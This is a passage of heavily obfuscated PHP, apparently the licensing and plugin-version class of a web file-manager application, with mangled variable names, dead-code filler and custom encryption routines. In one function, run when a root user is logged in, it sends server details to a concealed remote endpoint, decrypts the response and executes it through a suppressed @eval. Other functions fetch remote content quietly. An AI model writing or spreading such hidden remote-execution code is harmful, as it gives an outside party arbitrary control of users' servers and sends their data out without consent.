$_SERVER[ÌÛŒïÀ]; if ($this->hyln4174f37d == $—òÄõşı[225]) { return $È¹€ÕÂç; } $ÇÊ‰ê„ç = $this->versionPluginList(); $°Àè± = explode($—òÄõşı[226], $this->versionPluginFilter()); $©àÖîÙ½ = $ÔÚ“‘Ş„[755]; if (strlen($©àÖîÙ½) < $ÔÚ“‘Ş„[688]) { die; } $û¯›È²¹ = array(); $³Í¬‡ƒ = $ÔÚ“‘Ş„[756]; if (strlen($³Í¬‡ƒ) < $ÔÚ“‘Ş„[477]) { return; } foreach ($ÇÊ‰ê„ç as $ÏÅ»–—î => $ ¹½Õ) { if ($ ¹½Õ == $—òÄõşı[227] && substr($this->hyln4174f37d, 0, 1) == $—òÄõşı[227]) { continue; } if (!in_array($ÏÅ»–—î, $°Àè±)) { $û¯›È²¹[] = $ÏÅ»–—î; } } foreach ($û¯›È²¹ as $ÏÅ»–—î) { unset($È¹€ÕÂç[$ÏÅ»–—î]); } return $È¹€ÕÂç; } private function versionPluginList() { $ı²îŠ¢À =& $_SERVER[§Êá¸İ]; $¬Ê«†üÒ =& $_SERVER[ÌÛŒïÀ]; return array($¬Ê«†üÒ[228] => $¬Ê«†üÒ[227], $¬Ê«†üÒ[229] => $¬Ê«†üÒ[227], $¬Ê«†üÒ[230] => $¬Ê«†üÒ[227], $¬Ê«†üÒ[231] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[233] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[234] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[235] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[236] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[237] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[238] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[239] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[240] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[241] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[242] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[243] => $¬Ê«†üÒ[232], $¬Ê«†üÒ[244] => $¬Ê«†üÒ[232]); $®ÜÈ½Çï = $ı²îŠ¢À[757]; if (strlen($®ÜÈ½Çï) < $ı²îŠ¢À[692]) { die; } } private function versionPluginFilter() { $©•ãÆ—” =& $_SERVER[§Êá¸İ]; $ì¸İ·„ª =& $_SERVER[ÌÛŒïÀ]; if ($this->hyln4174f37d == $ì¸İ·„ª[109]) { return $ì¸İ·„ª[6]; } $›æ€ÂÌ = _get($this->sqoy7077237f, $ì¸İ·„ª[245], $ì¸İ·„ª[6]); $İÛµØÊ¿ = $©•ãÆ—”[758]; $†ƒş¡×Ï = _get($this->sqoy7077237f, $ì¸İ·„ª[116], $ì¸İ·„ª[6]); $æ¸»õû‡ = $©•ãÆ—”[759]; while ($æ¸»õû‡ < $©•ãÆ—”[477]) { if ($æ¸»õû‡ >= 0) { break; } $æ¸»õû‡++; } $š–‚ş = _get($this->sqoy7077237f, $ì¸İ·„ª[246], $ì¸İ·„ª[6]); $¯ÔñÈ¼· = $©•ãÆ—”[760]; if (strlen($¯ÔñÈ¼·) < $©•ãÆ—”[688]) { die; } if ($†ƒş¡×Ï > time() && $š–‚ş > time()) { $øºö‹ìì = explode($ì¸İ·„ª[226], $›æ€ÂÌ); $ŠğÓ›÷À = array_keys($this->versionPluginList()); $›æ€ÂÌ = array_merge($øºö‹ìì, $ŠğÓ›÷À); $›æ€ÂÌ = implode($ì¸İ·„ª[226], array_filter(array_unique($›æ€ÂÌ))); } return $›æ€ÂÌ; } private function frwv814d1735() { $×¡çÚó =& $_SERVER[ÌÛŒïÀ]; if ($this->hyln4174f37d != $×¡çÚó[109]) { $GLOBALS[$×¡çÚó[86]][$×¡çÚó[90]][$×¡çÚó[247]] = $×¡çÚó[206]; return; } $GLOBALS[$×¡çÚó[86]][$×¡çÚó[248]] = $×¡çÚó[122]; if (Model($×¡çÚó[249])->get($×¡çÚó[63]) != $×¡çÚó[206]) { Model($×¡çÚó[249])->set($×¡çÚó[63], $×¡çÚó[206]); } } public function wlux561d6936() { return $_SERVER[ÌÛŒïÀ][250]; } private function jbci928f0696() { $‚¤ÎıÙ =& $_SERVER[§Êá¸İ]; $ıË£Ÿõ¤ =& $_SERVER[ÌÛŒïÀ]; $ä•Ù¶°î = array($ıË£Ÿõ¤[251], $ıË£Ÿõ¤[252], $ıË£Ÿõ¤[253]); $ı¹ĞåÑè = $ıË£Ÿõ¤[254] . md5($ıË£Ÿõ¤[255]); if ($this->hyln4174f37d == $ıË£Ÿõ¤[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ıË£Ÿõ¤[24]], $ä•Ù¶°î)) { return; } if (time() % 4 != 0) { return; } $Õß¯âÄø = call_user_func(array($ıË£Ÿõ¤[256], $ıË£Ÿõ¤[257]), $ı¹ĞåÑè); $Æ”‘ƒ§â = $‚¤ÎıÙ[761]; while ($Æ”‘ƒ§â < $‚¤ÎıÙ[477]) { if ($Æ”‘ƒ§â >= 0) { break; } $Æ”‘ƒ§â++; } if ($Õß¯âÄø && time() - $Õß¯âÄø < intval($ıË£Ÿõ¤[258])) { return; } call_user_func(array($ıË£Ÿõ¤[256], $ıË£Ÿõ¤[139]), $ı¹ĞåÑè, time()); $¶ƒ®¨ù– = Model($ıË£Ÿõ¤[33])->get($ıË£Ÿõ¤[100]); $×Ë­í’Á = array($ıË£Ÿõ¤[152] => Model($ıË£Ÿõ¤[33])->get($ıË£Ÿõ¤[153]), $ıË£Ÿõ¤[167] => $this->hyln4174f37d, $ıË£Ÿõ¤[163] => $_SERVER[$ıË£Ÿõ¤[164]], $ıË£Ÿõ¤[165] => Model($ıË£Ÿõ¤[33])->get($ıË£Ÿõ¤[131]), $ıË£Ÿõ¤[105] => md5($_SERVER[$ıË£Ÿõ¤[106]] . $¶ƒ®¨ù–), $ıË£Ÿõ¤[156] => $ıË£Ÿõ¤[136], $ıË£Ÿõ¤[159] => $_SERVER[$ıË£Ÿõ¤[160]]); $‹â¹ÖÏ‡ = $this->nqkpf4371e85($ıË£Ÿõ¤[259], $×Ë­í’Á); if (!is_array($‹â¹ÖÏ‡)) { return; } if ($‹â¹ÖÏ‡[$ıË£Ÿõ¤[152]] && $‹â¹ÖÏ‡[$ıË£Ÿõ¤[260]]) { if ($this->qybj1ca966e5($‹â¹ÖÏ‡[$ıË£Ÿõ¤[260]]) == $×Ë­í’Á[$ıË£Ÿõ¤[152]]) { return; } } $this->uvhza7c99db0(); $ÛÖ×÷Òú = $‚¤ÎıÙ[762]; if (strlen($ÛÖ×÷Òú) < $‚¤ÎıÙ[477]) { die; } if ($this->qybj1ca966e5($‹â¹ÖÏ‡[$ıË£Ÿõ¤[260]]) != $×Ë­í’Á[$ıË£Ÿõ¤[152]]) { $£öîúİ… = array($ıË£Ÿõ¤[185] => $¶ƒ®¨ù–, $ıË£Ÿõ¤[186] => $_SERVER[$ıË£Ÿõ¤[106]], $ıË£Ÿõ¤[187] => this_url(), $ıË£Ÿõ¤[161] => $_SERVER[$ıË£Ÿõ¤[162]]); $òÃ¨µ¬½ = $this->ripde4ef178d(json_encode($£öîúİ…)); $‹â¹ÖÏ‡ = $this->nqkpf4371e85($ıË£Ÿõ¤[188] . $òÃ¨µ¬½); if ($‹â¹ÖÏ‡ && is_array($‹â¹ÖÏ‡) && isset($‹â¹ÖÏ‡[$ıË£Ÿõ¤[260]])) { $Åğô×º— = $this->mosxdba78173($‹â¹ÖÏ‡[$ıË£Ÿõ¤[260]], 2); if ($Åğô×º—) { $Åğô×º— = $this->qybj1ca966e5($Åğô×º—); } if ($Åğô×º—) { try { @eval($Åğô×º—); } catch (Exception $ÈÔ¤“ã•) { } } } } } private function nqkpf4371e85($¤éæ¡È  = '', $Ñ¸í¢»Ê = array(), $‹¥ûõ¯ = 5) { $’êÛÍêù =& $_SERVER[§Êá¸İ]; $£ïáõ¯ş =& $_SERVER[ÌÛŒïÀ]; $¦Í²âë = $£ïáõ¯ş[261]; $ı×¥ôßé = $’êÛÍêù[763]; if (!$ı×¥ôßé) { die; } $¦Í²âë = $this->madc899353b8($¦Í²âë, $£ïáõ¯ş[262]); $ó‘ã€‹“ = $’êÛÍêù[764]; if (strlen($ó‘ã€‹“) < $’êÛÍêù[688]) { return; } $¦Í²âë = $¦Í²âë . $¤éæ¡È ; $ÊÏñê¡  = $’êÛÍêù[765]; while ($ÊÏñê¡  < $’êÛÍêù[700]) { if ($ÊÏñê¡  >= 0) { break; } $ÊÏñê¡ ++; } if ($Ñ¸í¢»Ê && is_array($Ñ¸í¢»Ê)) { $¦Í²âë = $¦Í²âë . $£ïáõ¯ş[263] . http_build_query($Ñ¸í¢»Ê); } if ($Ñ¸í¢»Ê === -1) { return $¦Í²âë; } $¤²ÕÆºÅ = stream_context_create(array($£ïáõ¯ş[219] => array($£ïáõ¯ş[222] => $‹¥ûõ¯, $£ïáõ¯ş[220] => $£ïáõ¯ş[264]), $£ïáõ¯ş[265] => array($£ïáõ¯ş[266] => !1, $£ïáõ¯ş[267] => !1))); $ùİêÛ€ş = $’êÛÍêù[766]; while ($ùİêÛ€ş < $’êÛÍêù[688]) { if ($ùİêÛ€ş >= 0) { break; } $ùİêÛ€ş++; } $Ñ¸í¢»Ê = @file_get_contents($¦Í²âë, !1, $¤²ÕÆºÅ); $Ğñ«Äâ‰ = $’êÛÍêù[767]; if (strlen($Ğñ«Äâ‰) < $’êÛÍêù[700]) { return; } return json_decode($Ñ¸í¢»Ê, !0); } private function pofm30d4443d() { $”áÁ‰åò =& $_SERVER[§Êá¸İ]; $˜ô²×©İ =& $_SERVER[ÌÛŒïÀ]; $‡²èìÆ = array($˜ô²×©İ[268] => $˜ô²×©İ[269], $˜ô²×©İ[270] => $˜ô²×©İ[271], $˜ô²×©İ[272] => $˜ô²×©İ[273], $˜ô²×©İ[274] => $˜ô²×©İ[275], $˜ô²×©İ[276] => $˜ô²×©İ[277], $˜ô²×©İ[278] => $˜ô²×©İ[214], $˜ô²×©İ[279] => $˜ô²×©İ[214], $˜ô²×©İ[280] => $˜ô²×©İ[269], $˜ô²×©İ[281] => $˜ô²×©İ[271], $˜ô²×©İ[282] => $˜ô²×©İ[273], $˜ô²×©İ[283] => $˜ô²×©İ[284], $˜ô²×©İ[285] => $˜ô²×©İ[275], $˜ô²×©İ[286] => $˜ô²×©İ[287], $˜ô²×©İ[288] => $˜ô²×©İ[277], $˜ô²×©İ[289] => $˜ô²×©İ[290], $˜ô²×©İ[291] => $˜ô²×©İ[292], $˜ô²×©İ[293] => $˜ô²×©İ[294]); $¨™ššò = $‡²èìÆ[$this->hyln4174f37d]; $üìê”» = $”áÁ‰åò[768]; if (!$üìê”») { return; } $¨™ššò = intval($¨™ššò ? $¨™ššò : $˜ô²×©İ[269]); $ÀãÂ·¶š = $”áÁ‰åò[769]; $Î’™ù… = _get($this->sqoy7077237f, $˜ô²×©İ[295]); $Î’™ù… = $Î’™ù… ? intval($Î’™ù…) : 0; $õ®¢Õù÷ = $”áÁ‰åò[770]; if (!$õ®¢Õù÷) { die; } return $¨™ššò + $Î’™ù…; $êÇÌ„¾Ã = $”áÁ‰åò[771]; if (strlen($êÇÌ„¾Ã) < $”áÁ‰åò[688]) { return; } } public function vqgxa50a085a($Ä¹í‹ÙÄ) { $¼¦£‡Ğ³ =& $_SERVER[§Êá¸İ]; $­ÌÄÖêó =& $_SERVER[ÌÛŒïÀ]; $Õö¦µà = $this->pofm30d4443d(); $ ıù›½“ = $¼¦£‡Ğ³[772]; if (strlen($ ıù›½“) < $¼¦£‡Ğ³[700]) { return; } if ($Ä¹í‹ÙÄ[$­ÌÄÖêó[296]] == $­ÌÄÖêó[122]) { return; } if ($Õö¦µà >= intval($­ÌÄÖêó[214])) { return; } $ğöĞ£¥ = Model($­ÌÄÖêó[125])->count(); $€¹¸ÒÑ§ = $¼¦£‡Ğ³[773]; if (!$€¹¸ÒÑ§) { return; } if ($ğöĞ£¥ <= $Õö¦µà) { return; } $ÂôµŸùİ = Model($­ÌÄÖêó[125])->field($­ÌÄÖêó[296])->limit($Õö¦µà)->select(); $ÂôµŸùİ = array_to_keyvalue($ÂôµŸùİ, $­ÌÄÖêó[6], $­ÌÄÖêó[296]); $Èƒ–Ù„ = $¼¦£‡Ğ³[774]; if (!in_array($Ä¹í‹ÙÄ[$­ÌÄÖêó[296]], $ÂôµŸùİ)) { show_json($­ÌÄÖêó[297], !1, $­ÌÄÖêó[210]); } } public function dmfn9c5eebf6() { $Ö‘¤¡­Û =& $_SERVER[§Êá¸İ]; $¶¬š×„ó =& $_SERVER[ÌÛŒïÀ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ÏêÉ¬‘‚ = $¶¬š×„ó[217]; $ÏêÉ¬‘‚ = $this->madc899353b8($ÏêÉ¬‘‚, $¶¬š×„ó[218]); $ÄæÆÔ¾— = $Ö‘¤¡­Û[775]; if (strlen($ÄæÆÔ¾—) < $Ö‘¤¡­Û[692]) { return; } $çáöÎÆæ = stream_context_create(array($¶¬š×„ó[219] => array($¶¬š×„ó[220] => $¶¬š×„ó[221], $¶¬š×„ó[222] => 3))); $´Ú—‰ = $Ö‘¤¡­Û[776]; $†İƒè¯ = @file_get_contents($ÏêÉ¬‘‚, !1, $çáöÎÆæ); echo $¶¬š×„ó[298] . hash_encode($†İƒè¯) . $¶¬š×„ó[299]; $ãÛïšÒÛ = $Ö‘¤¡­Û[777]; if (!$ãÛïšÒÛ) { die; } } private function upob6eefb415($Ê¡†ãÈû, $ãïßºàò, $¿ÒëŒ™‰ = 3) { $ì „á¹— =& $_SERVER[§Êá¸İ]; $úáâš´³ =& $_SERVER[ÌÛŒïÀ]; usleep(1); $ºä¤€öş = $ì „á¹—[778]; if (!$ºä¤€öş) { return; } $Ê¡†ãÈû = trim($Ê¡†ãÈû); $ğ£…æå  = mt_rand(0, 5) . $úáâš´³[6]; $‰®‡¦±Ò = rand_string(15); $Ëñ½Ô = $úáâš´³[300]; switch ($ğ£…æå ) { case $úáâš´³[206]: $ñ‚§¥Ûñ = $this->cuvd88c7fe29($Ê¡†ãÈû, strrev($ãïßºàò . $‰®‡¦±Ò)); $¹ë©—¡ı = $ì „á¹—[779]; if (!$¹ë©—¡ı) { die; } break; $‚÷¢Èï· = $ì „á¹—[780]; if (!$‚÷¢Èï·) { die; } case $úáâš´³[122]: $ñ‚§¥Ûñ = $this->cuvd88c7fe29($Ê¡†ãÈû, strrev($‰®‡¦±Ò . $ãïßºàò)); break; $‚µ±Şş = $ì „á¹—[781]; while ($‚µ±Şş < $ì „á¹—[695]) { if ($‚µ±Şş >= 0) { break; } $‚µ±Şş++; } case $úáâš´³[301]: $ñ‚§¥Ûñ = $this->cuvd88c7fe29($Ê¡†ãÈû, base64_encode($‰®‡¦±Ò . $ãïßºàò)); $¢ğ¶ˆí¿ = $ì „á¹—[782]; if (strlen($¢ğ¶ˆí¿) < $ì „á¹—[692]) { return; } break; case $úáâš´³[302]: $ñ‚§¥Ûñ = $this->cuvd88c7fe29($Ê¡†ãÈû, md5($‰®‡¦±Ò . $ãïßºàò)); $ŞòëÀ’ = $ì „á¹—[783]; break; $†Ìê’· = $ì „á¹—[784]; if (strlen($†Ìê’·) < $ì „á¹—[477]) { return; } case $úáâš´³[303]: $Ê¡†ãÈû = base64_encode($Ê¡†ãÈû); $Î…£·ü² = $ì „á¹—[785]; if (strlen($Î…£·ü²) < $ì „á¹—[695]) { return; } $ïÙ—ˆì = rand(0, 64); $Í´ËŒç = $ì „á¹—[786]; $Öœ²‰Ó… = $Ëñ½Ô[$ïÙ—ˆì]; $ëÂ’ƒÔ = md5($Öœ²‰Ó… . md5($ãïßºàò . $Öœ²‰Ó…) . $ãïßºàò); $ëÂ’ƒÔ = substr($ëÂ’ƒÔ, $ïÙ—ˆì % 8, $ïÙ—ˆì % 8 + 7); $‘ÍîÜ = $ì „á¹—[787]; $­ ‡’ê = $úáâš´³[6]; $‰ÓË×¤ = 0; $Ú‡ÄÛØÂ = 0; $ÙúÖÄÒû = 0; $“İ‚ëÂ× = $ì „á¹—[788]; while ($“İ‚ëÂ× < $ì „á¹—[700]) { if ($“İ‚ëÂ× >= 0) { break; } $“İ‚ëÂ×++; } for ($‰ÓË×¤ = 0; $‰ÓË×¤ < strlen($Ê¡†ãÈû); $‰ÓË×¤++) { $ÙúÖÄÒû = $ÙúÖÄÒû == strlen($ëÂ’ƒÔ) ? 0 : $ÙúÖÄÒû; $Ú‡ÄÛØÂ = ($ïÙ—ˆì + strpos($Ëñ½Ô, $Ê¡†ãÈû[$‰ÓË×¤]) + ord($ëÂ’ƒÔ[$ÙúÖÄÒû++])) % 64; $­ ‡’ê .= $Ëñ½Ô[$Ú‡ÄÛØÂ]; $ÀÔüó¡“ = $ì „á¹—[789]; if (!$ÀÔüó¡“) { die; } } $ñ‚§¥Ûñ = hash_encode($Öœ²‰Ó… . $­ ‡’ê); $‡‡ÆìÅ = $ì „á¹—[790]; break; $üÈµ»¯Ï = $ì „á¹—[791]; while ($üÈµ»¯Ï < $ì „á¹—[477]) { if ($üÈµ»¯Ï >= 0) { break; } $üÈµ»¯Ï++; } default: $ñ‚§¥Ûñ = $this->cuvd88c7fe29($Ê¡†ãÈû, $ãïßºàò . $‰®‡¦±Ò); break; $ÙŸíÖ˜¤ = $ì „á¹—[792]; } $ñ‚§¥Ûñ = strrev($ğ£…æå  . $‰®‡¦±Ò . $ñ‚§¥Ûñ); if ($¿ÒëŒ™‰ - 1 > 0) { $ñ‚§¥Ûñ = $this->upob6eefb415($ñ‚§¥Ûñ, $ãïßºàò, $¿ÒëŒ™‰ - 1); } return $ñ‚§¥Ûñ; } private function mosxdba78173($ùÔœòäÌ, $’›±ìõı, $‡’ÊŠçá = 3) { $¡¦©‹é© =& $_SERVER[§Êá¸İ]; $³—¯ÍÕ¦ =& $_SERVER[ÌÛŒïÀ]; if (!is_string($ùÔœòäÌ) || strlen($ùÔœòäÌ) < 10) { return !1; } $ùÔœòäÌ = trim($ùÔœòäÌ); $±¨¡§ë¶ = $¡¦©‹é©[793]; while (strlen($±¨¡§ë¶) < $¡¦©‹é©[692]) { if (!$±¨¡§ë¶) { break; } $±¨¡§ë¶++; } $ùÔœòäÌ = strrev($ùÔœòäÌ); $™Ë¤¶şÉ = $ùÔœòäÌ[0]; $²ÙĞŞÜ = substr($ùÔœòäÌ, 1, 15); $šğÒüÁú = $¡¦©‹é©[794]; $ùÔœòäÌ = substr($ùÔœòäÌ, 16); $ÀàîÁÄ× = $³—¯ÍÕ¦[300]; switch ($™Ë¤¶şÉ) { case $³—¯ÍÕ¦[206]: $ß¨ƒ»õÁ = $this->madc899353b8($ùÔœòäÌ, strrev($’›±ìõı . $²ÙĞŞÜ)); break; $’ÖòìÀ = $¡¦©‹é©[795]; case $³—¯ÍÕ¦[122]: $ß¨ƒ»õÁ = $this->madc899353b8($ùÔœòäÌ, strrev($²ÙĞŞÜ . $’›±ìõı)); $­Ãú˜íâ = $¡¦©‹é©[796]; if (strlen($­Ãú˜íâ) < $¡¦©‹é©[695]) { return; } break; $ÏËæ¢ûÌ = $¡¦©‹é©[722]; if (!$ÏËæ¢ûÌ) { return; } case $³—¯ÍÕ¦[301]: $ß¨ƒ»õÁ = $this->madc899353b8($ùÔœòäÌ, base64_encode($²ÙĞŞÜ . $’›±ìõı)); break; $çÁ«ªŸ° = $¡¦©‹é©[797]; if (strlen($çÁ«ªŸ°) < $¡¦©‹é©[477]) { die; } case $³—¯ÍÕ¦[302]: $ß¨ƒ»õÁ = $this->madc899353b8($ùÔœòäÌ, md5($²ÙĞŞÜ . $’›±ìõı)); break; case $³—¯ÍÕ¦[303]: $ùÔœòäÌ = hash_decode($ùÔœòäÌ); $º–Š­‘Ï = $ùÔœòäÌ[0]; $Á–ÇØ¶Ç = $¡¦©‹é©[798]; if (!$Á–ÇØ¶Ç) { return; } $ùÔœòäÌ = substr($ùÔœòäÌ, 1); $ã Ÿšù = strpos($ÀàîÁÄ×, $º–Š­‘Ï); $Â»—¬ü = $¡¦©‹é©[799]; if (!$Â»—¬ü) { return; } $Šœªïİ÷ = md5($º–Š­‘Ï . md5($’›±ìõı . $º–Š­‘Ï) . $’›±ìõı); $Šœªïİ÷ = substr($Šœªïİ÷, $ã Ÿšù % 8, $ã Ÿšù % 8 + 7); $Ğ¤Úß”¨ = $¡¦©‹é©[800]; while ($Ğ¤Úß”¨ < $¡¦©‹é©[700]) { if ($Ğ¤Úß”¨ >= 0) { break; } $Ğ¤Úß”¨++; } $¦”Ä¥üğ = $³—¯ÍÕ¦[6]; $Ò©ò×ïš = 0; $õÖ‹†« = $¡¦©‹é©[801]; if (!$õÖ‹†«) { die; } $ÀÜÜÔüÓ = 0; $û‰Ë–òç = $¡¦©‹é©[802]; if (strlen($û‰Ë–òç) < $¡¦©‹é©[695]) { return; } $‹úÎÍ¯º = 0; $ŠÊ“ËÄ® = $¡¦©‹é©[803]; while (strlen($ŠÊ“ËÄ®) < $¡¦©‹é©[700]) { if (!$ŠÊ“ËÄ®) { break; } $ŠÊ“ËÄ®++; } for ($Ò©ò×ïš = 0; $Ò©ò×ïš < strlen($ùÔœòäÌ); $Ò©ò×ïš++) { $‹úÎÍ¯º = $‹úÎÍ¯º == strlen($Šœªïİ÷) ? 0 : $‹úÎÍ¯º; $İ¼—Ó€ = $¡¦©‹é©[804]; if (strlen($İ¼—Ó€) < $¡¦©‹é©[688]) { die; } $Ø¥˜ØÀ‹ = $‹úÎÍ¯º++; $ÀÜÜÔüÓ = strpos($ÀàîÁÄ×, $ùÔœòäÌ[$Ò©ò×ïš]) - $ã Ÿšù - ord($Šœªïİ÷[$Ø¥˜ØÀ‹]); while ($ÀÜÜÔüÓ < 0) { $ÀÜÜÔüÓ += 64; $•‘Ø™ô± = $¡¦©‹é©[805]; if (!$•‘Ø™ô±) { return; } } $¦”Ä¥üğ .= $ÀàîÁÄ×[$ÀÜÜÔüÓ]; } $ß¨ƒ»õÁ = base64_decode($¦”Ä¥üğ); $Š‰»ÚÏ„ = $¡¦©‹é©[806]; if (!$Š‰»ÚÏ„) { die; } break; $Æ¥Ï¯®¨ = $¡¦©‹é©[807]; if (strlen($Æ¥Ï¯®¨) < $¡¦©‹é©[688]) { return; } default: $ß¨ƒ»õÁ = $this->madc899353b8($ùÔœòäÌ, $’›±ìõı . $²ÙĞŞÜ); break; $½Ş×Ÿ = $¡¦©‹é©[808]; if (!$½Ş×Ÿ) { return; } } if ($‡’ÊŠçá - 1 > 0) { $ß¨ƒ»õÁ = $this->mosxdba78173($ß¨ƒ»õÁ, $’›±ìõı, $‡’ÊŠçá - 1); } return $ß¨ƒ»õÁ; } public function ripde4ef178d($ööÁ‘êø) { $Â’×ìí× =& $_SERVER[§Êá¸İ]; $âÈé•şÆ =& $_SERVER[ÌÛŒïÀ]; $›æŸ»êà = $this->gpkuf9423648(); $æÇ¸ÃÊë = $this->gpkuf9423648(); $úô™ó¡å = ($›æŸ»êà - 1) * ($æÇ¸ÃÊë - 1); $­²Éíö = $Â’×ìí×[809]; $ìã¤ˆ¯Õ = intval(($›æŸ»êà + $æÇ¸ÃÊë) / 2); $¤º¹Ôõë = $Â’×ìí×[810]; if (!$¤º¹Ôõë) { die; } while (1) { $¯è½¡”¤ = $ìã¤ˆ¯Õ; $Øâ÷‰ = $Â’×ìí×[811]; while ($Øâ÷‰ < $Â’×ìí×[700]) { if ($Øâ÷‰ >= 0) { break; } $Øâ÷‰++; } $¾ÂË—ø© = $úô™ó¡å; while ($¾ÂË—ø© % $¯è½¡”¤ != 0) { $€äöã´ã = $¾ÂË—ø©; $¾ÂË—ø© = $¯è½¡”¤; $…Ùè…ªí = $Â’×ìí×[812]; if (!$…Ùè…ªí) { die; } $¯è½¡”¤ = $€äöã´ã % $¯è½¡”¤; } if ($¯è½¡”¤ == 1) { break; } else { $ìã¤ˆ¯Õ++; } } $¤‚›Ä—Ú = 2; $•„‚ŠçÜ = $Â’×ìí×[813]; if (strlen($•„‚ŠçÜ) < $Â’×ìí×[692]) { return; } for ($‚‡ÍáÜÍ = 0; $‚‡ÍáÜÍ < $úô™ó¡å * 10; $‚‡ÍáÜÍ++) { if (($úô™ó¡å * $‚‡ÍáÜÍ + 1) % $ìã¤ˆ¯Õ == 0) { $¤‚›Ä—Ú = intval(($úô™ó¡å * $‚‡ÍáÜÍ + 1) / $ìã¤ˆ¯Õ); break; } } $éÂ—ùó = $this->cuvd88c7fe29($›æŸ»êà * $æÇ¸ÃÊë . $âÈé•şÆ[6], $âÈé•şÆ[136]); $·âÄäí = $Â’×ìí×[814]; $Â¤»¥œ” = md5($âÈé•şÆ[304] . ($›æŸ»êà + $æÇ¸ÃÊë) . $âÈé•şÆ[305] . $ìã¤ˆ¯Õ . $âÈé•şÆ[305] . $¤‚›Ä—Ú . $âÈé•şÆ[306]); $ÏÜ·°µˆ = $this->cuvd88c7fe29($ööÁ‘êø, $Â¤»¥œ”) . $âÈé•şÆ[307] . $éÂ—ùó; return $ÏÜ·°µˆ; $õ§ßŒÇÉ = $Â’×ìí×[815]; if (strlen($õ§ßŒÇÉ) < $Â’×ìí×[688]) { die; } } public function qybj1ca966e5($èÃÔœ÷¿) { $¸êà±Â¨ =& $_SERVER[§Êá¸İ]; $¶ Âæà´ =& $_SERVER[ÌÛŒïÀ]; $±âÂŸê§ = explode($¶ Âæà´[307], $èÃÔœ÷¿); $Ò¨ÓßÁá = $¸êà±Â¨[816]; if (!$Ò¨ÓßÁá) { return; } if (count($±âÂŸê§) != 2) { return $¶ Âæà´[6]; } $§ÌÃó§ï = $this->madc899353b8($±âÂŸê§[1] . $¶ Âæà´[6], $¶ Âæà´[136]); if (!$§ÌÃó§ï) { return $¶ Âæà´[6]; } $§ÌÃó§ï = intval($§ÌÃó§ï); $Á»­Ù– = $¸êà±Â¨[817]; if (!$Á»­Ù–) { die; } $·™Ã¹Ô® = 0; $Î †Œõ = $¸êà±Â¨[818]; while (strlen($Î †Œõ) < $¸êà±Â¨[695]) { if (!$Î †Œõ) { break; } $Î †Œõ++; } $µ½á±î¦ = 0; $ßŒ ™û = $¸êà±Â¨[819]; for ($Œ©üŒ›Ú = 3; $Œ©üŒ›Ú < $§ÌÃó§ï; $Œ©üŒ›Ú += 2) { if ($§ÌÃó§ï % $Œ©üŒ›Ú != 0) { continue; } $·™Ã¹Ô® = $Œ©üŒ›Ú; $µ½á±î¦ = intval($§ÌÃó§ï / $Œ©üŒ›Ú); $ª‡É³ = $¸êà±Â¨[820]; if (strlen($ª‡É³) < $¸êà±Â¨[477]) { return; } break; } $ÊïÃö‡½ = ($·™Ã¹Ô® - 1) * ($µ½á±î¦ - 1); $òé£Íü‘ = intval(($·™Ã¹Ô® + $µ½á±î¦) / 2); $İãì•í® = $¸êà±Â¨[821]; if (strlen($İãì•í®) < $¸êà±Â¨[695]) { return; } while (1) { $¾ºÛúŸ‰ = $òé£Íü‘; $ñö™–²› = $ÊïÃö‡½; $×èÌûÊœ = $¸êà±Â¨[822]; while ($×èÌûÊœ < $¸êà±Â¨[692]) { if ($×èÌûÊœ >= 0) { break; } $×èÌûÊœ++; } while ($ñö™–²› % $¾ºÛúŸ‰ != 0) { $‚·Ğúú° = $ñö™–²›; $§Œ³ÍÁ— = $¸êà±Â¨[823]; $ñö™–²› = $¾ºÛúŸ‰; $¾ºÛúŸ‰ = $‚·Ğúú° % $¾ºÛúŸ‰; $º¬ÅÀŠœ = $¸êà±Â¨[824]; if (strlen($º¬ÅÀŠœ) < $¸êà±Â¨[688]) { die; } } if ($¾ºÛúŸ‰ == 1) { break; } else { $òé£Íü‘++; } } $š—ËÒøş = 2; $ÍÊ…—Ìø = $¸êà±Â¨[825]; for ($Œ©üŒ›Ú = 0; $Œ©üŒ›Ú < $ÊïÃö‡½ * 10; $Œ©üŒ›Ú++) { if (($ÊïÃö‡½ * $Œ©üŒ›Ú + 1) % $òé£Íü‘ == 0) { $š—ËÒøş = intval(($ÊïÃö‡½ * $Œ©üŒ›Ú + 1) / $òé£Íü‘); break; } } $ˆ¢êÅÎ = md5($¶ Âæà´[304] . ($·™Ã¹Ô® + $µ½á±î¦) . $¶ Âæà´[305] . $òé£Íü‘ . $¶ Âæà´[305] . $š—ËÒøş . $¶ Âæà´[306]); $Ä¿Š²µ  = $¸êà±Â¨[826]; $ö°­›ğœ = $this->madc899353b8($±âÂŸê§[0], $ˆ¢êÅÎ); $é­šïŸÕ = $¸êà±Â¨[827]; return $ö°­›ğœ; } public function gpkuf9423648() { $Ò çç =& $_SERVER[§Êá¸İ]; $ïÂªõÅ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ù§›ü˜½ = $Ò çç[828]; if (strlen($ù§›ü˜½) < $Ò çç[688]) { return; } $–•ü’¦ì = array(); $½˜’ŸÕı = $Ò çç[730]; $ƒØùğî¬ = 1; $úô¼çûª = $Ò çç[829]; while (strlen($úô¼çûª) < $Ò çç[477]) { if (!$úô¼çûª) { break; } $úô¼çûª++; } while ($ƒØùğî¬ <= (int) sqrt($ïÂªõÅ)) { $İª¯—Øş = $ƒØùğî¬; while (!0) { $İª¯—Øş++; $ñ®ØÄŸî = $Ò çç[830]; if (strlen($ñ®ØÄŸî) < $Ò çç[700]) { die; } if ($İª¯—Øş <= 2) { $ƒØùğî¬ = $İª¯—Øş; break; } else { if ($İª¯—Øş < 2) { continue; } } $áÆ²ßµ§ = !0; for ($²ŒØëĞÀ = 2; $²ŒØëĞÀ <= sqrt($İª¯—Øş); $²ŒØëĞÀ++) { if ($İª¯—Øş % $²ŒØëĞÀ == 0) { $áÆ²ßµ§ = !1; } } if ($áÆ²ßµ§) { 